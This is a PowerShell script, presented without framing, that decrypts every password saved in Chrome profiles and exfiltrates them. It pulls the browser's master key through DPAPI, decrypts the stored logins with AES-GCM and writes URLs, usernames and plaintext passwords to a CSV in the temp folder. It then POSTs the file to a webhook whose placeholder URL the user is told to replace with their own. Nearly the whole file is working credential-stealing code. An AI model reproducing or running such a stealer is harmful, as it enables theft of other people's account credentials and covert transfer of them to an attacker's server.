# Define paths
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$outputCsv = "$env:TEMP\decrypted_passwords.csv"
$webhookUrl = "http://localhost/webhook/webhook.php"  # Replace with your webhook URL

# Function to get the decryption key
function Get-ChromeKey {
    try {
        $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        $encryptedKey = [Convert]::FromBase64String($encryptedKey)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return $decryptedKey
    } catch {
        Write-Error "Failed to retrieve Chrome encryption key: $_"
        return $null
    }
}

# Function to decrypt a password
function Decrypt-ChromePassword {
    param ([byte[]]$cipherText, [byte[]]$key)
    try {
        $iv = $cipherText[3..14]
        $encryptedPassword = $cipherText[15..($cipherText.Length - 17)]
        $aes = New-Object System.Security.Cryptography.AesGcm $key
        $decryptedPassword = [byte[]]::new($encryptedPassword.Length)
        $aes.Decrypt($iv, $encryptedPassword, $null, $decryptedPassword)
        return [System.Text.Encoding]::UTF8.GetString($decryptedPassword)
    } catch {
        Write-Error "Failed to decrypt password: $_"
        return ""
    }
}

# Function to read the login database
function Get-ChromeLogins {
    param ([string]$dbPath, [byte[]]$key)
    try {
        $tempDb = "$env:TEMP\Loginvault.db"
        Copy-Item -Path $dbPath -Destination $tempDb -Force
        $connectionString = "Data Source=$tempDb;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection $connectionString
        $connection.Open()
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT action_url, username_value, password_value FROM logins"
        $reader = $command.ExecuteReader()
        while ($reader.Read()) {
            $url = $reader["action_url"]
            $username = $reader["username_value"]
            $cipherText = $reader["password_value"]
            if ($url -and $username -and $cipherText) {
                $password = Decrypt-ChromePassword ([byte[]]$cipherText) $key
                [PSCustomObject]@{ URL = $url; Username = $username; Password = $password }
            }
        }
        $reader.Close()
        $connection.Close()
        Remove-Item -Path $tempDb -Force
    } catch {
        Write-Error "Failed to read Chrome logins: $_"
    }
}

# Main script
try {
    $key = Get-ChromeKey
    if (-not $key) { throw "Failed to retrieve encryption key" }
    $results = @()
    $profiles = Get-ChildItem -Path $loginDataPath -Directory | Where-Object { $_.Name -match "^Profile|^Default$" }
    foreach ($profile in $profiles) {
        $dbPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
        if (Test-Path $dbPath) {
            $results += Get-ChromeLogins -dbPath $dbPath -key $key
        }
    }
    $results | Export-Csv -Path $outputCsv -NoTypeInformation -Encoding UTF8
    Write-Output "Passwords saved to $outputCsv"

    # Send the data to the webhook
    $csvData = Get-Content -Path $outputCsv -Raw
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $csvData -ContentType "text/plain"
    Write-Output "Passwords sent to the webhook: $webhookUrl"
} catch {
    Write-Error "An error occurred: $_"
}
